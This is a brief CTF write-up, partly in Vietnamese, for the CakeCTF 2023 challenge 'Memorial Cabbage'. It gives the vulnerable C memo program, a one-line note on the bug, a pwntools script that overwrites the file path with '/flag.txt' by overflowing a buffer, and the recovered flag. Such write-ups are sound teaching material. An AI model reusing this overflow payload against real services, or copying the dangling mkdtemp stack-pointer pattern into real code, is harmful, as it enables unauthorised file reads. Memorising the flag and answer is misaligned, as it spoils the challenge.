# Memorial Cabbage 

## scource C

```c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TEMPDIR_TEMPLATE "/tmp/cabbage.XXXXXX"

static char *tempdir;

void setup() {
  char template[] = TEMPDIR_TEMPLATE;

  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  if (!(tempdir = mkdtemp(template))) {
    perror("mkdtemp");
    exit(1);
  }
  if (chdir(tempdir) != 0) {
    perror("chdir");
    exit(1);
  }
}

void memo_r() {
  FILE *fp;
  char path[0x20];
  char buf[0x1000];

  strcpy(path, tempdir);
  strcpy(path + strlen(TEMPDIR_TEMPLATE), "/memo.txt");
  if (!(fp = fopen(path, "r")))
    return;
  fgets(buf, sizeof(buf) - 1, fp);
  fclose(fp);

  printf("Memo: %s", buf);
}

void memo_w() {
  FILE *fp;
  char path[0x20];
  char buf[0x1000];

  printf("Memo: ");
  if (!fgets(buf, sizeof(buf)-1, stdin))
    exit(1);

  strcpy(path, tempdir);
  strcpy(path + strlen(TEMPDIR_TEMPLATE), "/memo.txt");
  if (!(fp = fopen(path, "w")))
    return;
  fwrite(buf, 1, strlen(buf), fp);
  fclose(fp);
}

int main() {
  int choice;

  setup();
  while (1) {
    printf("1. Write memo\n"
           "2. Read memo\n"
           "> ");
    if (scanf("%d%*c", &choice) != 1)
      break;
    switch (choice) {
      case 1: memo_w(); break;
      case 2: memo_r(); break;
      default: return 0;
    }
  }
}

```

đơn giản là bof để orw **/memo.txt** thành **/flag.txt\0**

## script 

```python 
from pwn import *

p = remote('memorialcabbage.2023.cakectf.com', 9001)

p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'Memo: ')
p.sendline(b'a'*0xff0 + b'/flag.txt\0')
p.recvuntil(b'> ')
p.sendline(b'2')

p.interactive()

# CakeCTF{B3_c4r3fuL_s0m3_libc_fuNcT10n5_r3TuRn_5t4ck_p01nT3r}
```
